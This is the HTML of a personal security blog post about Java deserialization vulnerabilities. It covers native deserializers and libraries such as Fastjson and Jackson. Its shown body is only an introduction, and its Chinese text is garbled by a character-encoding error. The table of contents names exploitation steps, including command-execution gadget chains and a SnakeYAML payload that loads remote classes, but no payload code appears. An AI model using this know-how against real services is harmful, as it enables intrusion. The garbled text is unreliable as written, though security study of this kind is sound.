<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="Javaååºåˆ—åŒ–1ï¼ˆåŸç”Ÿç±»ï¼‰åºåˆ—åŒ–æ˜¯å°†Javaå¯¹è±¡è½¬æ¢æˆå­—èŠ‚æµçš„è¿‡ç¨‹ã€‚è€Œååºåˆ—åŒ–æ˜¯å°†å­—èŠ‚æµè½¬æ¢æˆJavaå¯¹è±¡çš„è¿‡ç¨‹ï¼Œjavaåºåˆ—åŒ–çš„æ•°æ®ä¸€èˆ¬ä¼šä»¥æ ‡è®°(ac ed 00 05)å¼€å¤´ï¼Œbase64ç¼–ç çš„ç‰¹å¾ä¸ºrO0ABï¼ŒJAVAå¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•æœ‰JAVA åŸç”Ÿåºåˆ—åŒ–å’ŒJSON ç±»ï¼ˆfastjsonã€jacksonï¼‰åºåˆ—åŒ–ç­‰ã€‚ Javaä¸­å¯åˆ†ä¸ºï¼šåŸç”Ÿååºåˆ—åŒ–ç±»(ObjectInputStre">
<meta property="og:type" content="article">
<meta property="og:title" content="Javaååºåˆ—åŒ–æ¼æ´">
<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/09/21/Java%E6%94%BB%E9%98%B2/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="å­éé±¼çš„åšå®¢">
<meta property="og:description" content="Javaååºåˆ—åŒ–1ï¼ˆåŸç”Ÿç±»ï¼‰åºåˆ—åŒ–æ˜¯å°†Javaå¯¹è±¡è½¬æ¢æˆå­—èŠ‚æµçš„è¿‡ç¨‹ã€‚è€Œååºåˆ—åŒ–æ˜¯å°†å­—èŠ‚æµè½¬æ¢æˆJavaå¯¹è±¡çš„è¿‡ç¨‹ï¼Œjavaåºåˆ—åŒ–çš„æ•°æ®ä¸€èˆ¬ä¼šä»¥æ ‡è®°(ac ed 00 05)å¼€å¤´ï¼Œbase64ç¼–ç çš„ç‰¹å¾ä¸ºrO0ABï¼ŒJAVAå¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•æœ‰JAVA åŸç”Ÿåºåˆ—åŒ–å’ŒJSON ç±»ï¼ˆfastjsonã€jacksonï¼‰åºåˆ—åŒ–ç­‰ã€‚ Javaä¸­å¯åˆ†ä¸ºï¼šåŸç”Ÿååºåˆ—åŒ–ç±»(ObjectInputStre">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817202102756.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817202233197.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817202354020.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817202445424.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817202638395.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817204917444.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817225010002.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817225104004.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817231341939.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250818201836064.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250818202755093.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250818202954523.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250818203008778.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250817232105941.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250818203553496.png">
<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250818214718656.png">
<meta property="article:published_time" content="2025-09-21T11:45:25.000Z">
<meta property="article:modified_time" content="2025-09-21T12:10:28.027Z">
<meta property="article:author" content="å­éé±¼">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="å®‰å…¨">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/image-20250817202102756.png">


<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/09/21/Java%E6%94%BB%E9%98%B2/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/09/21/Java%E6%94%BB%E9%98%B2/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","path":"2025/09/21/Javaæ”»é˜²/Javaååºåˆ—åŒ–æ¼æ´/","title":"Javaååºåˆ—åŒ–æ¼æ´"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Javaååºåˆ—åŒ–æ¼æ´ | å­éé±¼çš„åšå®¢</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">å­éé±¼çš„åšå®¢</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">åœ¨æ—¶é—´çš„å°ºåº¦ä¸Šï¼Œä¸€åˆ‡é—®é¢˜éƒ½æœ‰ç­”æ¡ˆ</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="æœç´¢" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961%EF%BC%88%E5%8E%9F%E7%94%9F%E7%B1%BB%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Javaååºåˆ—åŒ–1ï¼ˆåŸç”Ÿç±»ï¼‰</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.</span> <span class="nav-text">ä»‹ç»</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%9A%99%EF%B8%8F-%E4%B8%80%E3%80%81%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB"><span class="nav-number">2.1.</span> <span class="nav-text">âš™ï¸ ä¸€ã€åŸç”Ÿååºåˆ—åŒ–ç±»</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-ObjectInputStream-readObject"><span class="nav-number">2.1.1.</span> <span class="nav-text">1. ObjectInputStream.readObject()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-SnakeYaml"><span class="nav-number">2.1.2.</span> <span class="nav-text">2. SnakeYaml</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-XMLDecoder"><span class="nav-number">2.1.3.</span> <span class="nav-text">3. XMLDecoder</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94"><span class="nav-number">2.1.4.</span> <span class="nav-text">åŸç”Ÿæ–¹å¼å¯¹æ¯”</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%93%A6-%E4%BA%8C%E3%80%81%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%84%E4%BB%B6"><span class="nav-number">2.2.</span> <span class="nav-text">ğŸ“¦ äºŒã€ç¬¬ä¸‰æ–¹ååºåˆ—åŒ–ç»„ä»¶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Fastjson"><span class="nav-number">2.2.1.</span> <span class="nav-text">1. Fastjson</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Jackson"><span class="nav-number">2.2.2.</span> <span class="nav-text">2. Jackson</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-XStream"><span class="nav-number">2.2.3.</span> <span class="nav-text">3. XStream</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E9%A3%8E%E9%99%A9%E5%85%B1%E6%80%A7"><span class="nav-number">2.2.4.</span> <span class="nav-text">ç¬¬ä¸‰æ–¹åº“é£é™©å…±æ€§</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%9B%A1%EF%B8%8F-%E4%B8%89%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="nav-number">2.3.</span> <span class="nav-text">ğŸ›¡ï¸ ä¸‰ã€ååºåˆ—åŒ–å®‰å…¨é˜²æŠ¤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E5%AF%B9%E6%AF%94"><span class="nav-number">2.3.1.</span> <span class="nav-text">æ¼æ´å½±å“å¯¹æ¯”</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%92%8E-%E6%80%BB%E7%BB%93"><span class="nav-number">2.4.</span> <span class="nav-text">ğŸ’ æ€»ç»“</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA"><span class="nav-number">3.</span> <span class="nav-text">é¶åœº</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">åºåˆ—åŒ–æ¼æ´</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#readObjext"><span class="nav-number">4.1.</span> <span class="nav-text">readObjext</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8"><span class="nav-number">4.1.1.</span> <span class="nav-text">å·¥å…·åˆ©ç”¨</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Yakit"><span class="nav-number">4.1.2.</span> <span class="nav-text">Yakit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%A0%B8%E5%BF%83%E5%88%A4%E6%96%AD%E4%BE%9D%E6%8D%AE%EF%BC%9A%E7%9B%AE%E6%A0%87%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="nav-number">4.2.</span> <span class="nav-text">ä¸€ã€æ ¸å¿ƒåˆ¤æ–­ä¾æ®ï¼šç›®æ ‡ç¯å¢ƒä¿¡æ¯</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87%E4%BD%BF%E7%94%A8%E7%9A%84%E6%A1%86%E6%9E%B6-%E4%BE%9D%E8%B5%96%E5%BA%93"><span class="nav-number">4.2.1.</span> <span class="nav-text">1. ç¡®å®šç›®æ ‡ä½¿ç”¨çš„æ¡†æ¶ &#x2F; ä¾èµ–åº“</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%A1%AE%E8%AE%A4%E4%BE%9D%E8%B5%96%E5%BA%93%E7%9A%84%E7%89%88%E6%9C%AC"><span class="nav-number">4.2.2.</span> <span class="nav-text">2. ç¡®è®¤ä¾èµ–åº“çš„ç‰ˆæœ¬</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%88%86%E6%9E%90%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%B1%BB%E5%9E%8B%E5%8F%8A%E9%99%90%E5%88%B6"><span class="nav-number">4.2.3.</span> <span class="nav-text">3. åˆ†æç›®æ ‡åº”ç”¨ç±»å‹åŠé™åˆ¶</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%97%B6%E7%9A%84%E9%93%BE%E9%80%89%E6%8B%A9%E9%80%BB%E8%BE%91"><span class="nav-number">4.3.</span> <span class="nav-text">äºŒã€å·¥å…·ä½¿ç”¨æ—¶çš„é“¾é€‰æ‹©é€»è¾‘</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%85%88%E7%94%A8-%E2%80%9C%E6%97%A0%E5%8D%B1%E5%AE%B3%E6%8E%A2%E6%B5%8B%E9%93%BE%E2%80%9D-%E9%AA%8C%E8%AF%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8"><span class="nav-number">4.3.1.</span> <span class="nav-text">1. å…ˆç”¨ â€œæ— å±å®³æ¢æµ‹é“¾â€ éªŒè¯ååºåˆ—åŒ–æ¼æ´å­˜åœ¨</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%A0%B9%E6%8D%AE%E4%BE%9D%E8%B5%96%E5%BA%93%E5%8C%B9%E9%85%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E9%93%BE"><span class="nav-number">4.3.2.</span> <span class="nav-text">2. æ ¹æ®ä¾èµ–åº“åŒ¹é…å¯æ‰§è¡Œå‘½ä»¤çš„é“¾</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%8E%92%E9%99%A4%E6%B3%95%EF%BC%9A%E4%BB%8E-%E2%80%9C%E9%AB%98%E5%85%BC%E5%AE%B9%E6%80%A7%E2%80%9D-%E5%88%B0-%E2%80%9C%E4%B8%93%E5%B1%9E%E9%93%BE%E2%80%9D"><span class="nav-number">4.3.3.</span> <span class="nav-text">3. æ’é™¤æ³•ï¼šä» â€œé«˜å…¼å®¹æ€§â€ åˆ° â€œä¸“å±é“¾â€</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%85%B8%E5%9E%8B%E5%9C%BA%E6%99%AF%E7%A4%BA%E4%BE%8B"><span class="nav-number">4.4.</span> <span class="nav-text">ä¸‰ã€å…¸å‹åœºæ™¯ç¤ºä¾‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.5.</span> <span class="nav-text">æ€»ç»“</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-chains"><span class="nav-number">4.5.1.</span> <span class="nav-text">Java-chains</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xmldecoder"><span class="nav-number">4.6.</span> <span class="nav-text">xmldecoder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BB%A3%E7%A0%81%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B"><span class="nav-number">4.7.</span> <span class="nav-text">ä¸€ã€ä»£ç å¯¹æ•°æ®åŒ…çš„å¤„ç†æµç¨‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SnakeYaml"><span class="nav-number">4.8.</span> <span class="nav-text">SnakeYaml</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">4.8.1.</span> <span class="nav-text">åŸç†</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81SnakeYAML-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B"><span class="nav-number">4.9.</span> <span class="nav-text">ä¸€ã€SnakeYAML ååºåˆ—åŒ–çš„æ­£å¸¸æµç¨‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%9A%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">4.10.</span> <span class="nav-text">äºŒã€å®‰å…¨é£é™©ï¼šé»˜è®¤é…ç½®ä¸‹çš„ååºåˆ—åŒ–æ¼æ´æˆå› </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">4.11.</span> <span class="nav-text">ä¸‰ã€æ€»ç»“</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B"><span class="nav-number">4.11.1.</span> <span class="nav-text">æµç¨‹</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E7%9A%84%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91"><span class="nav-number">4.12.</span> <span class="nav-text">ä¸€ã€åç«¯ä»£ç çš„å¤„ç†é€»è¾‘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Payload-%E7%9A%84%E7%BB%93%E6%9E%84%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-number">4.13.</span> <span class="nav-text">äºŒã€Payload çš„ç»“æ„ä¸æ‰§è¡Œæµç¨‹</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%AE%9E%E4%BE%8B%E5%8C%96java-net-URL%E5%AF%B9%E8%B1%A1"><span class="nav-number">4.13.1.</span> <span class="nav-text">1. å®ä¾‹åŒ–java.net.URLå¯¹è±¡</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%AE%9E%E4%BE%8B%E5%8C%96java-net-URLClassLoader%E5%AF%B9%E8%B1%A1"><span class="nav-number">4.13.2.</span> <span class="nav-text">2. å®ä¾‹åŒ–java.net.URLClassLoaderå¯¹è±¡</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%AE%9E%E4%BE%8B%E5%8C%96javax-script-ScriptEngineManager%E5%AF%B9%E8%B1%A1"><span class="nav-number">4.13.3.</span> <span class="nav-text">3. å®ä¾‹åŒ–javax.script.ScriptEngineManagerå¯¹è±¡</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="å­éé±¼"
      src="/images/1.png">
  <p class="site-author-name" itemprop="name">å­éé±¼</p>
  <div class="site-description" itemprop="description">å­¦ä¹ è¿‡ç¨‹çš„è®°å½•</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">27</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/zifeiyu-sec" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://gitee.com/zifeiyu-sec" title="Gitee â†’ https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          é“¾æ¥
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/09/21/Java%E6%94%BB%E9%98%B2/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.png">
      <meta itemprop="name" content="å­éé±¼">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å­éé±¼çš„åšå®¢">
      <meta itemprop="description" content="å­¦ä¹ è¿‡ç¨‹çš„è®°å½•">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Javaååºåˆ—åŒ–æ¼æ´ | å­éé±¼çš„åšå®¢">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Javaååºåˆ—åŒ–æ¼æ´
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2025-09-21 19:45:25 / ä¿®æ”¹æ—¶é—´ï¼š20:10:28" itemprop="dateCreated datePublished" datetime="2025-09-21T19:45:25+08:00">2025-09-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Javaæ”»é˜²</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="Javaååºåˆ—åŒ–1ï¼ˆåŸç”Ÿç±»ï¼‰"><a href="#Javaååºåˆ—åŒ–1ï¼ˆåŸç”Ÿç±»ï¼‰" class="headerlink" title="Javaååºåˆ—åŒ–1ï¼ˆåŸç”Ÿç±»ï¼‰"></a>Javaååºåˆ—åŒ–1ï¼ˆåŸç”Ÿç±»ï¼‰</h2><p>åºåˆ—åŒ–æ˜¯å°†Javaå¯¹è±¡è½¬æ¢æˆå­—èŠ‚æµçš„è¿‡ç¨‹ã€‚è€Œååºåˆ—åŒ–æ˜¯å°†å­—èŠ‚æµè½¬æ¢æˆJavaå¯¹è±¡çš„è¿‡ç¨‹ï¼Œjavaåºåˆ—åŒ–çš„æ•°æ®ä¸€èˆ¬ä¼šä»¥æ ‡è®°(ac ed 00 05)å¼€å¤´ï¼Œbase64ç¼–ç çš„ç‰¹å¾ä¸ºrO0ABï¼ŒJAVAå¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•æœ‰JAVA åŸç”Ÿåºåˆ—åŒ–å’ŒJSON ç±»ï¼ˆfastjsonã€jacksonï¼‰åºåˆ—åŒ–ç­‰ã€‚</p>
<p>Javaä¸­å¯åˆ†ä¸ºï¼šåŸç”Ÿååºåˆ—åŒ–ç±»(ObjectInputStream.readObject()ã€SnakeYamlã€XMLDecoderç­‰)ã€ä¸‰æ–¹ç»„ä»¶ååºåˆ—åŒ–(Fastjsonã€Jacksonã€Xstreamç­‰)</p>
<p>Javaååºåˆ—åŒ–æœºåˆ¶æ˜¯å¯¹è±¡æŒä¹…åŒ–å’Œç½‘ç»œä¼ è¾“çš„æ ¸å¿ƒï¼Œä½†ä¹Ÿå› å…¶å¤æ‚æ€§æˆä¸ºå®‰å…¨æ¼æ´çš„é«˜å‘åŒºã€‚ä»¥ä¸‹ä»åŸç”Ÿååºåˆ—åŒ–ç±»å’Œç¬¬ä¸‰æ–¹ç»„ä»¶ä¸¤æ–¹é¢è¿›è¡Œç³»ç»Ÿæ€§åˆ†æï¼š</p>
<hr>
<span id="more"></span>
